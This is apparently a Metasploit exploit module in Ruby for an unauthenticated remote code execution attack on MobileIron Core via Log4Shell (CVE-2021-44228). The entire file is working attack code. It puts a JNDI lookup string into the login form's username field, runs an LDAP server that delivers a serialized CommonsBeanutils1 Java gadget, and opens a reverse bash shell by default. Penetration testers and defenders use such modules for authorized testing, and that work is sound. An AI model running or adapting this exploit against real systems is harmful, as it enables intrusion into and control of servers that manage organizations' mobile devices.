##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Log4Shell
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => 'MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)',
      'Description' => %q{
        MobileIron Core is affected by the Log4Shell vulnerability whereby a JNDI string sent to the server
        will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS
        command execution in the context of the tomcat user.

        This module will start an LDAP server that the target will need to connect to.
      },
      'Author' => [
        'Spencer McIntyre', # JNDI/LDAP lib stuff
        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff
        'rwincey', # discovered log4shell vector in MobileIron
        'jbaines-r7' # wrote this module
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis'],
        [ 'URL', 'https://forums.ivanti.com/s/article/Security-Bulletin-CVE-2021-44228-Remote-code-injection-in-Log4j?language=en_US' ],
        [ 'URL', 'https://www.mandiant.com/resources/mobileiron-log4shell-exploitation' ]
      ],
      'DisclosureDate' => '2021-12-12',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true,
        'SRVPORT' => 389,
        'WfsDelay' => 30
      },
      'Targets' => [
        [
          'Linux', {
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          },
        ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION],
        'RelatedModules' => [
          'auxiliary/scanner/http/log4shell_scanner',
          'exploit/multi/http/log4shell_header_injection'
        ]
      }
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'Base path', '/'])
    ])
  end

  def wait_until(&block)
    datastore['WfsDelay'].times do
      break if block.call

      sleep(1)
    end
  end

  def check
    validate_configuration!

    vprint_status('Attempting to trigger the jndi callback...')

    start_service
    res = trigger
    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?

    wait_until { @search_received }
    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')
  ensure
    cleanup_service
  end

  def build_ldap_search_response_payload
    return [] if @search_received

    @search_received = true

    return [] unless @exploiting

    print_good('Delivering the serialized Java object to execute the payload...')
    build_ldap_search_response_payload_inline('CommonsBeanutils1')
  end

  def trigger
    @search_received = false

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'mifs', 'j_spring_security_check'),
      'headers' => {
        'Referer' => "https://#{rhost}#{normalize_uri(target_uri, 'mifs', 'user', 'login.jsp')}"
      },
      'encode' => false,
      'vars_post' => {
        'j_username' => log4j_jndi_string,
        'j_password' => Rex::Text.rand_text_alphanumeric(8),
        'logincontext' => 'employee'
      }
    )
  end

  def exploit
    validate_configuration!
    @exploiting = true
    start_service
    res = trigger
    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?
    fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way') unless res.code == 302

    wait_until { @search_received && (!handler_enabled? || session_created?) }
    handler
  end
end
